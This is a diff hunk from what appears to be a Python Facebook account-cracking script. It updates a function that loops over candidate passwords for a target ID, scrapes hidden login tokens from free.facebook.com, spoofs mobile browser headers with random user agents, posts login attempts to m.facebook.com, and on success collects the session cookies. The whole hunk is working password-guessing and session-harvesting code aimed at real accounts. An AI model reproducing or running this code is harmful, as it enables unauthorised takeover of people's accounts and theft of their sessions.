@@ -1163,25 +1163,51 @@ def m5(idf,pwv):
   for ps in pwv:
    session = requests.Session()
    pro = random.choice(ugen)
-   free_fb = session.get(f'https://lm.facebook.com').text
-   log_data = f'm_ts=1720466522&li=WjyMZjhRKSnpDduWLiGouq-x&try_number=0&unrecognized_tries=0&email=%2B{idf}&prefill_contact_point=%2B37065785678&prefill_source=provided_or_soft_matched&prefill_type=contact_point&first_prefill_source=provided_or_soft_matched&first_prefill_type=contact_point&had_cp_prefilled=true&had_password_prefilled=false&is_smart_lock=false&bi_xrwh=0&bi_wvdp=%7B%22hwc%22%3Atrue%2C%22hwcr%22%3Afalse%2C%22has_dnt%22%3Atrue%2C%22has_standalone%22%3Afalse%2C%22wnd_toStr_toStr%22%3A%22function%20toString()%20%7B%20%5Bnative%20code%5D%20%7D%22%2C%22hasPerm%22%3Atrue%2C%22permission_query_toString%22%3A%22function%20query()%20%7B%20%5Bnative%20code%5D%20%7D%22%2C%22permission_query_toString_toString%22%3A%22function%20toString()%20%7B%20%5Bnative%20code%5D%20%7D%22%2C%22has_seWo%22%3Atrue%2C%22has_meDe%22%3Atrue%2C%22has_creds%22%3Atrue%2C%22has_hwi_bt%22%3Afalse%2C%22has_agjsi%22%3Afalse%2C%22iframeProto%22%3A%22function%20get%20contentWindow()%20%7B%20%5Bnative%20code%5D%20%7D%22%2C%22remap%22%3Afalse%2C%22iframeData%22%3A%7B%22hwc%22%3Atrue%2C%22hwcr%22%3Afalse%2C%22has_dnt%22%3Atrue%2C%22has_standalone%22%3Afalse%2C%22wnd_toStr_toStr%22%3A%22function%20toString()%20%7B%20%5Bnative%20code%5D%20%7D%22%2C%22hasPerm%22%3Atrue%2C%22permission_query_toString%22%3A%22function%20query()%20%7B%20%5Bnative%20code%5D%20%7D%22%2C%22permission_query_toString_toString%22%3A%22function%20toString()%20%7B%20%5Bnative%20code%5D%20%7D%22%2C%22has_seWo%22%3Atrue%2C%22has_meDe%22%3Atrue%2C%22has_creds%22%3Atrue%2C%22has_hwi_bt%22%3Afalse%2C%22has_agjsi%22%3Afalse%7D%7D&encpass=%23PWD_BROWSER%3A5%3A1720466530%{ps}&fb_dtsg=NAcMcZFhXQtZgIV7-vNtIPt314nPoq6Ey_1maUywkL0-GHN_V4kccAA%3A0%3A0&jazoest=24862&lsd=AVpCekR6AL8&__dyn=1KQdAG1mws8-t0BBBzEnwuo98nwgU2owpUuwcC4o1nEhwem0iy1gCwjE1xoswaq1Jw20Ehw73wGwcq0RE1u86i0h-0zE1bE881eEdEG0hi0Lo6-0Co178dE1UU3jw&__csr=&__req=2&__fmt=1&__a=AYnXk_bvFCha-hzuETlLYrKv4JDGNxzMFJCdbgFppEL3Gk1EuvGkIPscGXyuxXtczjhGSbJIUjeRkSnExPLQDYZ0Y71ExPRMXVnOx1cWNB1DRg&__user=0'
-   header_freefb = {'authority':'business.facebook.com',
-            'method': 'POST',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-encoding':'gzip, deflate, br',
-            'accept-language': 'en-US,en;q=0.9,en;q=0.8',
-            'cache-control': 'max-age=0',
-            'sec-ch-ua': '"Google Chrome";v="106", "Not)A;Brand";v="99", "Chromium";v="106"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Linux"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'} #'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
-   lo = session.post('https://touch.beta.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
+   free_fb = session.get(f'https://free.facebook.com').text
+   log_data = {
+        "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1), 
+        "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1), 
+        "display": "",
+        "isprivate": "",
+        "return_session": "",
+        "skip_api_login": "",
+        "signed_next": "",
+        "trynum": "1",
+        "timezone": "420",
+        "lgndim": "eyJ3IjoxOTIwLCJoIjoxMDgwLCJhdyI6MTkyMCwiYWgiOjEwNDAsImMiOjI0fQ%3D%3D",
+        "lgnrnd": "033753_ik6I",
+        "lgnjs": "1714300673",
+        "email": idf,
+        "prefill_contact_point": "",
+        "prefill_source": "",
+        "prefill_type": "",
+        "first_prefill_source": "",
+        "first_prefill_type": "",
+        "had_cp_prefilled": "false",
+        "had_password_prefilled": "false",
+        "ab_test_data": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+        "encpass": "#PWD_BROWSER:0:{}:{}".format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),ps),}
+   header_freefb = {
+    'authority': 'm.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
+    'cache-control': 'max-age=0',
+    'dpr': '2.200000047683716',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"23076PC4BI"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"14.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+    'viewport-width': '980',} #'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
+   lo = session.post('https://m.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
